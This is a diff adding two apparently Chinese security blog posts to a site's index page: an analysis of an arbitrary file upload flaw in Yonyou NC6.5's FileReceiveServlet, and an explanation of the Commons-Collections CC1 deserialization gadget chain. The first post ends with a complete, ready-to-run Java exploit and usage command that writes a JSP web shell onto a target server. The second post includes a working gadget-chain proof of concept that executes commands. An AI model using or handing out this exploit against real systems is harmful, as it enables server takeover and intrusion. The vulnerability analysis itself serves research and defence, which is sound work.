@@ -55,12 +55,290 @@
       
         <li><a href="/categories">Categories</a></li>
       
+        <li><a href="/links">Links</a></li>
+      
     </ul>
   </nav>
 </header>
 
     <main class="site-main posts-loop">
     
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/23/用友NC6-5文件上传漏洞分析/"><span>用友NC6.5文件上传漏洞分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/23/用友NC6-5文件上传漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-23T03:49:38.000Z">
+          2021-10-23
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用友NC这个系统在国内用户量还是挺多的，由于这个系统本身不开源且代码量极多，所以这个系统可能会存在大量的漏洞但挖掘的人相对较少，所以还是值得花时间去挖掘漏洞的，本次和大家一起分析用友NC6.5的任意文件上传漏洞，由于这个上传接口是将传入的数据反序列化解析后再上传的，所以exp对于很多同学来说不太容易构造，本次就带大家一起分析一下这个漏洞，文章的最后我会给出大家这个漏洞的exp。</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>​        用友NC的搭建就不多说了，我们看下如何调试，用友NC搭建好后的目录是下面这样的。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216155829711.png" alt="image-20201216155829711"></p>
+<p>​    可以点击startServer.bat来启动用友NC，启动后我们可以看到主要是通过下面红框的内容来运行用友的，我们可以将这句话复制下来，加上我们的调试代码后在cmd下直接运行开启调试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\yonyou\home\ufjdk\bin\java -Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,address&#x3D;9999,server&#x3D;y,suspend&#x3D;n -server -Xmx768m -XX:PermSize&#x3D;128m -XX:MaxPermSize&#x3D;512m -Djava.awt.headless&#x3D;true -Dfile.encoding&#x3D;GBK -Duser.timezone&#x3D;GMT+8 -Dnc.server.name&#x3D;server -Dnc.server.startCount&#x3D;0 -DNC_JAVA_HOME&#x3D;$JAVA_HOME -Dorg.owasp.esapi.resources&#x3D;E:\yonyou\home&#x2F;ierp&#x2F;bin&#x2F;esapi -Dnc.bs.logging.format&#x3D;text -Dnc.server.location&#x3D;E:\yonyou\home -Drun.side&#x3D;server -Dnc.run.side&#x3D;server -cp E:\yonyou\home\starter.jar;E:\yonyou\home\ufjdk\lib\tools.jar;E:\yonyou\home\ant\lib\ant-launcher.jar;E:\yonyou\home\lib\cnytiruces.jar nc.bs.mw.start.AloneBootstrap start</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216155945901.png" alt="image-20201216155945901"></p>
+<p>​        开启后我们的主机会开启9999端口</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216160224203.png" alt="image-20201216160224203"></p>
+<p>​        再开启我们的神器IDEA,将用友的所有代码导入，并且开启远程调试</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216160315988.png" alt="image-20201216160315988"></p>
+<p>​        启动环境后我们需要测试一下是否可以正常调试，通过web.xml中我们可以看到所有的请求都会经过LoggerFilter过滤器，所以我们只要找到这个过滤器对应的类LoggerServletFilter打个断点即可测试。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216160601573.png" alt="image-20201216160601573"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216160635750.png" alt="image-20201216160635750"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​        之前t00ls上已经有人给出了POC，通过POC我们知道导致这个漏洞的是<code>/servlet/FileReceiveServlet</code>接口，那么我们如何知道处理这个请求的是哪个类呢？我们先看下web.xml中的配置，所有访问servlet下的请求都会由NCInvokerServlet这个servlet来处理，而NCInvokerServlet是由InvokerServlet这个类来处理的。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161013921.png" alt="image-20201216161013921"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161104474.png" alt="image-20201216161104474"></p>
+<p>​        我们找到InvokerServlet的doPost和doGeet方法，可以看到都是调用doAction来进行处理的。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161216749.png" alt="image-20201216161216749"></p>
+<p>​        我们可以随便请求一个路径比如:<code>servlet\xxxx</code>来跟踪一下doAction的处理流程，在这个方法是的开始，首先从请求中获取security_token和user_code并判断是否非空。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161606047.png" alt="image-20201216161606047"></p>
+<p>​        中间的过程就是获取路径信息赋值给serviceName，再调用了getServiceObject方法，这个方法会去判断我们请求的路径是否由对应的处理器处理，没有的话会抛异常。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161727157.png" alt="image-20201216161727157"></p>
+<p>​        跟进getServiceObject方法，调用了lookup方法。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216162135939.png" alt="image-20201216162135939"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216162348531.png" alt="image-20201216162348531"></p>
+<p>​        在getServerContext的lookup方法中，判断name的内容是否为Server，由于这里不为server因此会调用父类的lookup。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216162528500.png" alt="image-20201216162528500"></p>
+<p>​        跟进父类AbstractContext的lookup方法，我们可以看到在这个方法中会根据name的不同执行不同的操作，如果name以java:comp/env/开始，则会执行JndiContext.lookup，其他的类似也是根据name的值执行不同的方法，如果都没有匹配成功，则会调用findMeta</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216164806227.png" alt="image-20201216164806227"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216170026353.png" alt="image-20201216170026353"></p>
+<p>​    跟进findMeta，会调用ComponentMeta的getMeta，继续跟进会this.nameIndices中来获取我们传入的name值，这里由于我们传入的xxx没有，所以没有找到返回null。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216170154130.png" alt="image-20201216170154130"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216170213052.png" alt="image-20201216170213052"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216170238664.png" alt="image-20201216170238664"></p>
+<p>​        如果我们传入的是FileReceiveServlet则可以正常获取并返回。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216171030438.png" alt="image-20201216171030438"></p>
+<p>​        返回后，通过meta.getEjbName()获取FileReceiveServlet对应的jndiName的值</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216171532013.png" alt="image-20201216171532013"></p>
+<p>​        通过findComponent获取FileReceiveServlet的实例并返回</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216172242491.png" alt="image-20201216172242491"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216172328113.png" alt="image-20201216172328113"></p>
+<p>​        一直返回到InvokerServlet后执行获取到的FileReceiveServlet对象的service方法</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216172559306.png" alt="image-20201216172559306"></p>
+<p>​            由于FileReceiveServlet类并没有service方法，因此会先调用其父类也就是HTTPServlet的serive方法，在service方法中根据请求的类型调用不同的方法，由于我们这里是get类型，因此最终会执行到FileReceiveServlet类的doGet方法。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216173021350.png" alt="image-20201216173021350"></p>
+<p>​    跟进doGet方法我们可以看到，无论调用get或者post，最终都是调用handleRequest方法来进行处理的。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216173333987.png" alt="image-20201216173333987"></p>
+<p>​        跟进handleRequest我们可以看到，首先获取了请求的输入流和相应的输出流。再通过readObject直接对我们传入的数据进行反序列化，所以这个漏洞不仅仅是一个上传漏洞也是一个反序列化漏洞，不过对于反序列化漏洞的利用不仅仅是readObject，还要找到一些依赖的组件，不过用友NC的代码量那么多这个也不难，先不说反序列化漏洞，我们继续看这个上传漏洞。</p>
+<p>​        通过readObject进行反序列化以后，将反序列化后的结果转换为map类型，其中map的键为String值为Object。再获取metaInfo的TARGET_FILE_PATH和FILE_NAME属性来当作path和filename，最后将获取的request输入流中的内容当作文件的内容进行写入。可以看到在整个文件上传的过程中，并没有对文件的后缀或者内容做任何限制，所以我们可以通过这个漏洞在任意目录下写入任意后缀的文件。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216173506942.png" alt="image-20201216173506942"></p>
+<h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>​        经过上面的漏洞分析，我们已经对这个漏洞的成因有了一定的了解，在这个了解的基础上我们就可以尝试来构造POC，首先在反序列化后会获取一个MAP对象，并获取其中的两个属性，所以在我们的POC中，需要创建这两个属性并进行赋值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; metaInfo &#x3D; null;</span><br><span class="line">metaInfo.put(&quot;TARGET_FILE_PATH&quot;, &quot;E:&#x2F;yonyou&#x2F;home&#x2F;webapps&#x2F;nc_web&quot;);</span><br><span class="line">metaInfo.put(&quot;FILE_NAME&quot;, &quot;test666.jsp&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​        另外我们需要将传入的内容进行序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream oos &#x3D; new ObjectOutputStream(httpUrlConn.getOutputStream());</span><br><span class="line">oos.writeObject(metaInfo);</span><br></pre></td></tr></table></figure>
+
+<p>​        最后我们需要将我们想要写入的文件转换成输入流发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File file &#x3D; new File(&quot;C:\\Users\\admin\\Desktop\\test.jsp&quot;);</span><br><span class="line">      Long filelength &#x3D; file.length(); &#x2F;&#x2F; 获取文件长度</span><br><span class="line">      byte[] filecontent &#x3D; new byte[filelength.intValue()];</span><br><span class="line">      try &#123;</span><br><span class="line">          FileInputStream in &#x3D;new FileInputStream(file);</span><br><span class="line">          byte[] buf &#x3D; new byte[1024];</span><br><span class="line">          int len &#x3D; 0;</span><br><span class="line">          while ((len &#x3D; in.read(buf)) !&#x3D; -1) &#123;</span><br><span class="line">              oos.write(buf, 0, len);</span><br><span class="line">          &#125;</span><br><span class="line">          oos.flush();</span><br><span class="line">          oos.close();</span><br></pre></td></tr></table></figure>
+
+<p>​        最后给出我简陋的POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class upload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        BufferedReader reader;</span><br><span class="line">        StringBuffer response;</span><br><span class="line">        String uri&#x3D;&quot;&quot;;</span><br><span class="line">        String url2&#x3D;&quot;&quot;;</span><br><span class="line">        String path&#x3D;&quot;&#x2F;servlet&#x2F;FileReceiveServlet&quot;;</span><br><span class="line">        Map&lt;String, Object&gt; metaInfo &#x3D; new HashMap&lt;String, Object&gt;();</span><br><span class="line">        metaInfo.put(&quot;TARGET_FILE_PATH&quot;, &quot;webapps&#x2F;nc_web&quot;);</span><br><span class="line">        metaInfo.put(&quot;FILE_NAME&quot;, &quot;sectest666.jsp&quot;);</span><br><span class="line">        uri&#x3D;args[0];</span><br><span class="line">        url2&#x3D;uri+path;</span><br><span class="line">        URL url &#x3D; new URL(url2);</span><br><span class="line">        HttpURLConnection httpUrlConn &#x3D; (HttpURLConnection)url.openConnection();</span><br><span class="line">        httpUrlConn.setRequestProperty(&quot;Content-Type&quot;,&quot;application&#x2F;x-java-serialized-object&quot;);</span><br><span class="line">        httpUrlConn.setDoOutput(true);</span><br><span class="line">        httpUrlConn.setDoInput(true);</span><br><span class="line">        httpUrlConn.setUseCaches(false);</span><br><span class="line">        httpUrlConn.setRequestMethod(&quot;POST&quot;);</span><br><span class="line">        httpUrlConn.connect();</span><br><span class="line">        ByteArrayOutputStream baos&#x3D;new ByteArrayOutputStream();</span><br><span class="line">        OutputStream out &#x3D; httpUrlConn.getOutputStream();</span><br><span class="line">        ObjectOutputStream oos &#x3D; new ObjectOutputStream(out);</span><br><span class="line">        oos.writeObject(metaInfo);</span><br><span class="line">        File file &#x3D; new File(args[1]);</span><br><span class="line">        Long filelength &#x3D; file.length(); &#x2F;&#x2F; 获取文件长度</span><br><span class="line">        byte[] filecontent &#x3D; new byte[filelength.intValue()];</span><br><span class="line">        try &#123;</span><br><span class="line">            FileInputStream in &#x3D;new FileInputStream(file);</span><br><span class="line">            byte[] buf &#x3D; new byte[1024];</span><br><span class="line">            int len &#x3D; 0;</span><br><span class="line">            while ((len &#x3D; in.read(buf)) !&#x3D; -1) &#123;</span><br><span class="line">                baos.write(buf, 0, len);</span><br><span class="line">            &#125;</span><br><span class="line">            baos.flush();</span><br><span class="line">            baos.writeTo(out);</span><br><span class="line">            baos.close();</span><br><span class="line">            InputStream inputStream &#x3D; httpUrlConn.getInputStream();</span><br><span class="line">            reader &#x3D; new BufferedReader(new InputStreamReader(inputStream, &quot;UTF-8&quot;));</span><br><span class="line">            String lines;</span><br><span class="line">            response &#x3D; new StringBuffer(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">            while ((lines &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                response.append(lines);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch(FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch(IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        url2&#x3D;uri+&quot;&#x2F;sectest666.jsp&quot;;</span><br><span class="line">        URL httpUrl &#x3D; new URL(url2);</span><br><span class="line">        HttpURLConnection httpURLConnection &#x3D; (HttpURLConnection) httpUrl.openConnection();</span><br><span class="line">        httpURLConnection.setReadTimeout(50000);</span><br><span class="line">        httpURLConnection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">        int code &#x3D; httpURLConnection.getResponseCode();</span><br><span class="line">        if(code&#x3D;&#x3D;200)&#123;</span><br><span class="line">            System.out.println(&quot;上传成功！！！！！&quot;);</span><br><span class="line">            System.out.println(&quot;shell 地址:\n&quot;+uri+&quot;&#x2F;sectest666.jsp&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        使用方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar yongyou.jar http:&#x2F;&#x2F;192.168.3.30  D:\yijianma.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201217144654672.png" alt="image-20201217144654672"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201217144925282.png" alt="image-20201217144925282"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2021/10/23/CC1利用链分析/"><span>CC1利用链分析</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/23/CC1利用链分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-23T03:47:04.000Z">
+          2021-10-23
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <pre><code>这个利用链小兄弟们都分析过了，所以我大概了解下。主要是解决我看到这个利用链的一些疑惑。这条利用链的POC如下。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">       <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">       Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">               new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">       Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">       Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">       innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">       <span class="comment">//给予map数据转化链</span></span><br><span class="line">       Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">       <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">       Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">       Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">       <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">       ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">       Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">       FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"xxx.bin"</span>);</span><br><span class="line">       ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">       fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">       FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"xxx.bin"</span>);</span><br><span class="line">       ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">       <span class="comment">//服务端反序列化</span></span><br><span class="line">       fin.readObject();</span><br></pre></td></tr></table></figure>
+
+<h2 id="问题一：什么是Transformer？"><a href="#问题一：什么是Transformer？" class="headerlink" title="问题一：什么是Transformer？"></a>问题一：什么是Transformer？</h2><p>​        Transformer顾名思义是<code>转换器</code>，Transformer提供了一个transform方法，可以将我们传入的对象转换成其他对象。当然，Transformer仅仅是一个接口，具体转换的逻辑是由其实现类来处理的。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603145710604.png" alt="image-20210603145710604"></p>
+<p>​        在<code>commons-collections</code>中，有多个Transformer的实现类，不同的Transformer实现不同的转换逻辑。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603145939944.png" alt="image-20210603145939944"></p>
+<h2 id="问题二：POC中的Transformer是做什么的？"><a href="#问题二：POC中的Transformer是做什么的？" class="headerlink" title="问题二：POC中的Transformer是做什么的？"></a>问题二：POC中的Transformer是做什么的？</h2><p><strong>ConstantTransformer</strong></p>
+<p>​        在构造方法上，接收传入的对象并保存到iConstant中，当调用transform时，无论传入什么对象，均返回iConstant存储的对象。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603150440833.png" alt="image-20210603150440833"></p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603150957826.png" alt="image-20210603150957826"></p>
+<p><strong>InvokerTransformer</strong></p>
+<p>​        InvokerTransformer则是漏洞最终触发的原因，在InvokerTransformer的transform方法中，通过反射调用任意类的任意非private方法。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603151358735.png" alt="image-20210603151358735"></p>
+<p>​        假如我们想通过反射调用Runtime类的exec方法执行命令,可以使用下面的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer inv=new InvokerTransformer("exec",new Class[] &#123;String.class&#125;,new Object[]&#123;"calc.exe"&#125;);</span><br><span class="line">inv.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>
+
+<p><strong>ChainedTransformer</strong></p>
+<p>​        ChainedTransformer接收一个transformer数组，通过for循环调用每个transformer的transform方法，并将前一个transformer的转换结果作为后一个转换的输入。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604092936963.png" alt="image-20210604092936963"></p>
+<h2 id="问题三：如何调用到InvokerTransformer的transform方法？"><a href="#问题三：如何调用到InvokerTransformer的transform方法？" class="headerlink" title="问题三：如何调用到InvokerTransformer的transform方法？"></a>问题三：如何调用到InvokerTransformer的transform方法？</h2><p><strong>思路一：直接找到某个重写了readObject的类，并且这个类里调用了transform方法</strong></p>
+<p>​        我找了<code>commons-collections</code>中所有的readObject方法，并没有找到一个调用了transform方法的实现。</p>
